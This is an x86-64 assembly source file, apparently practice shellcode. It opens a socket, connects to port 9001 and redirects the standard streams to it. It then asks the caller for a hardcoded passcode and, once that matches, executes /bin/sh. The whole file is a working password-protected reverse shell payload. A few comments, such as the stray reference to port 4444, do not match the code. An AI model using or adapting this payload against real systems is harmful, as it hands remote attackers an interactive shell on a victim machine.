
global _start


_start:

        jmp main
        ask_pass: db "Tell me the passcode", 0xa

main:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 

        xor rsi, rsi
        mul rsi

	add rax, 41
        push byte 0x2
	pop rdi
	inc rsi
	;xor rdx, rdx 
	syscall

	; copy socket descriptor to rdi for future use 

	xchg rdi, rax


	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)

	xor rax, rax 

        push rax                ; pushing 0.0.0.0 into in_addr
        push word 0x2923        ;little endian -> 9001 = 0x2329
                                ; byte first ... 0x115C is 4444)
        push word 0x2           ; AF_INET - which is 0x02

        mov rsi, rsp            ; moving stack address to rsi


	; connect(sock, (struct sockaddr *)&server, sockaddr_len)
	
	xor rax, rax
	mov rdx, rax
	add rax, 42
	mov rsi, rsp
	add rdx, 16
	syscall


        ; duplicate sockets

        ; dup2 (new, old)

        xor rax, rax
	mov al, 33
        xor rsi, rsi
        syscall


        mov al, 33
        inc rsi
        syscall

        mov al, 33
        inc rsi
        syscall

        ; ############ asking for password ------------------------------

        password:

        ; sys_write
        ; rax : 1 - write syscall number
        ; rdi : unsigned int fd : 1 for stdout
        ; rsi : const char *buf : password buffer
        ; rdx : size_t count : password size
        xor rax, rax
        xor rdx, rdx ; or cqo??
        inc rax
        mov rdi, rax
        lea rsi, [rel ask_pass]
        mov dl, 21
        syscall


        ; sys_read
        ; rdi : unsigned int fd : 0 for stdin
        ; rsi : char *buf : stack?
        ; rdx : size_t count : how big

        xor rdx, rdx
        xor rax, rax
        xor rdi, rdi


        ; rax is already zero
        mov rsi, rsp
        add rdx, 32 ;password size
        syscall

        mov rdi, rsp
        xor rsi, rsi
        push rsi
        mov rsi, 0x0a646f6f676f6e6f ; \ndoogono  --> \n - new line byte = 0x0a
        push rsi
        mov rsi, 0x7470756d61697461 ; tpumaita
        push rsi
        mov rsi, 0x6874726165777379 ; htraewsy
        push rsi
        mov rsi, 0x6c6e6d656c6f7369 ; lnmelosi
        push rsi
        mov rsi, rsp                ; password buffer pointer
        xor rcx, rcx
        add rcx, 32                 ; 31 bytes for password and 1 byte for newline char
        repe cmpsb
        jne password


        ; ###### ------------------------------------------

        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall
 

